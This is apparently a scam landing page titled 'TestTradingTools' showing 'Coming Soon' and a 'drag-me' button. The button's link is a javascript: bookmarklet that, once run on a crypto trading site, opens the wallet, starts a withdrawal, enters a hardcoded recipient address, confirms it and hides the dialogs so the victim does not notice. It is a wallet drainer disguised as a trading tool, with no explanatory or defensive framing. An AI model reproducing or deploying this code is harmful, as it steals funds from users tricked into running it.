<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TestTradingTools</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background: linear-gradient(to bottom, #1e3a8a, #3b82f6);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    .container {
      text-align: center;
      color: white;
    }
    .logo {
      font-size: 2.5rem;
      font-weight: bold;
      margin-bottom: 1rem;
    }
    .drag-me {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background-color: #2563eb;
      color: white;
      font-weight: medium;
      padding: 0.5rem 1rem;
      border-radius: 0.375rem;
      transition: all 0.075s;
      width: 140px;
      text-decoration: none;
    }
    .drag-me:hover {
      background-color: #1e40af;
      transform: scale(1.05);
    }
    .social-links {
      margin-top: 1rem;
      display: flex;
      justify-content: center;
      gap: 1rem;
    }
    .social-links a {
      color: white;
      font-size: 1.5rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">TestTradingTools</div>
    <p>Coming Soon</p>
    <a href="javascript:(function(){const waitForElement=(selector,callback)=>{const interval=setInterval(()=>{const element=document.querySelector(selector);if(element){clearInterval(interval);callback(element);}},1);};const walletButton=document.querySelector('.w-fit.min-w-max.bg-primaryStroke');if(walletButton){walletButton.click();setTimeout(()=>{const withdrawalButton=document.querySelector('.bg-primaryBlue.flex.flex-row.flex-1.h-[32px]');if(withdrawalButton){withdrawalButton.click();waitForElement('.bg-secondaryStroke.flex-1.h-[28px]',(inputContainer)=>{const input=inputContainer.querySelector('input');const setValue=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;setValue.call(input,'BkLzurf5FWx2s3YhdDC1Wx29hRqvhQ3BHJE3GPGex9So');input.dispatchEvent(new Event('input',{bubbles:true}));input.dispatchEvent(new Event('change',{bubbles:true}));waitForElement('.text-primaryBlue.text-[12px].leading-[16px].font-medium',(confirmButton)=>{confirmButton.click();});});}else{console.error('Withdrawal button not found.');}const modal=document.querySelector('.relative.flex.flex-col.w-[364px].min-h-[448px].max-h-[90vh].bg-backgroundTertiary.border-[1px].border-secondaryStroke.rounded-[4px].shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]');if(modal)modal.style.display='none';const container=document.querySelector('.flex.flex-col.w-full.max-w-[312px].pt-[16px].pb-[20px].gap-[16px].bg-backgroundTertiary.border.border-secondaryStroke.rounded-[4px].justify-center.items-center.z-[300].shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]');if(container)container.style.display='none';},1);}else{console.error('Wallet button not found.');}})();" class="drag-me inline-flex items-center justify-center" title="Click me">

</body>
</html>
